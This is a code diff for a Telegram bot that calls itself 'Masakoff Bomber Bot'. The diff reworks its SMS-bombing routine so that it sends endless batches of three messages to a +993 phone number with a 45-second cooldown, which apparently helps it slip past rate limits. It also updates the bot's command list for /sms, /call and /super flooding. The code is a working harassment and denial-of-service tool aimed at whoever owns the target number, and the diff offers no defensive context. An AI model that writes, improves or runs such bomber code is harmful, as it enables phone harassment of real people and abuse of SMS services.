@@ -178,43 +178,66 @@ async function runSuper(chatId: string, phoneNumber: string) {
   }
 }
 
-// --- 💣 SMS sending job (NOW INFINITE LOOP) ---
+// --- 💣 SMS sending job (INFINITE with batch of 3 + 45s cooldown) ---
 async function runSMS(chatId: string, phoneNumber: string) {
   const key = ["task", chatId];
-  await kv.set(key, { type: "sms", phoneNumber, stop: false, attempt: 0 });
+  await kv.set(key, { type: "sms", phoneNumber, stop: false, batch: 0, attempt: 0 });
 
-  await sendMessage(chatId, `📱 Starting INFINITE SMS bombing to +993${phoneNumber} 🔥\n🔁 Will continue until stopped with /stop`);
+  await sendMessage(chatId, `📱 Starting INFINITE SMS bombing to +993${phoneNumber} 🔥\n🔁 3 SMS → Wait 45s → Repeat forever...`);
 
   try {
-    let attempt = 0;
+    let batch = 0;
     while (true) {
       const task = await kv.get(key);
       if (!task.value || task.value.stop) break;
 
-      attempt++;
-      await kv.set(key, { ...task.value, attempt });
+      batch++;
+      await kv.set(key, { ...task.value, batch });
 
-      await sendMessage(chatId, `📤 Attempt ${attempt}: Sending SMS to +993${phoneNumber}...`);
-      const ok = await sendSingleSMS(phoneNumber);
+      await sendMessage(chatId, `📤 Starting batch ${batch} — sending up to 3 SMS to +993${phoneNumber}...`);
 
-      if (ok) {
-        await sendMessage(chatId, `✅ SMS #${attempt} sent successfully!`);
-      } else {
-        await sendMessage(chatId, `⚠️ SMS #${attempt} failed. Continuing...`);
+      // --- Send 3 SMS with 5s gap ---
+      for (let i = 1; i <= 3; i++) {
+        const check = await kv.get(key);
+        if (!check.value || check.value.stop) break;
+
+        const currentAttempt = (check.value.attempt || 0) + 1;
+        await kv.set(key, { ...check.value, attempt: currentAttempt });
+
+        await sendMessage(chatId, `📤 Batch ${batch}, SMS #${i}/3: Sending to +993${phoneNumber}...`);
+        const ok = await sendSingleSMS(phoneNumber);
+
+        if (ok) {
+          await sendMessage(chatId, `✅ SMS #${i} of batch ${batch} sent successfully!`);
+        } else {
+          await sendMessage(chatId, `⚠️ SMS #${i} of batch ${batch} failed. Continuing...`);
+        }
+
+        const afterSend = await kv.get(key);
+        if (!afterSend.value || afterSend.value.stop) break;
+
+        // Wait 5 seconds between SMS (except after the 3rd)
+        if (i < 3) {
+          const waitOk = await sleepInterruptible(5000, chatId);
+          if (!waitOk) break;
+        }
       }
 
-      const afterSend = await kv.get(key);
-      if (!afterSend.value || afterSend.value.stop) break;
+      const afterBatch = await kv.get(key);
+      if (!afterBatch.value || afterBatch.value.stop) break;
 
-      await sendMessage(chatId, `⏳ Waiting 5 seconds before next SMS...`);
-      const waitOk = await sleepInterruptible(5000, chatId);
+      // --- Wait 45 seconds after every batch of 3 ---
+      await sendMessage(chatId, `⏳ Batch ${batch} complete. Waiting 45 seconds before next batch...`);
+      const waitOk = await sleepInterruptible(45000, chatId);
       if (!waitOk) break;
     }
   } catch (e) {
     console.error("SMS task error ❌", e);
   } finally {
+    const finalState = await kv.get(key);
+    const totalAttempts = finalState.value?.attempt || 0;
     await kv.delete(key);
-    await sendMessage(chatId, `⏹ SMS bombing stopped for +993${phoneNumber}. Total attempts: ${attempt} 🎉`);
+    await sendMessage(chatId, `⏹ SMS bombing stopped for +993${phoneNumber}. Total attempts: ${totalAttempts} 🎉`);
   }
 }
 
@@ -273,7 +296,7 @@ serve(async (req) => {
     await sendMessage(chatId,
       "👋 Welcome to 💥 Masakoff Bomber Bot 💥\n\n" +
       "📲 Commands:\n" +
-      "• /sms <number> — start INFINITE SMS bombing\n" +
+      "• /sms <number> — start INFINITE SMS bombing (3 SMS → 45s wait)\n" +
       "• /call <number> — start sending calls\n" +
       "• /super <number> — SMS + Call loop forever\n" +
       "• /stop — stop all sending ⛔\n\n" +
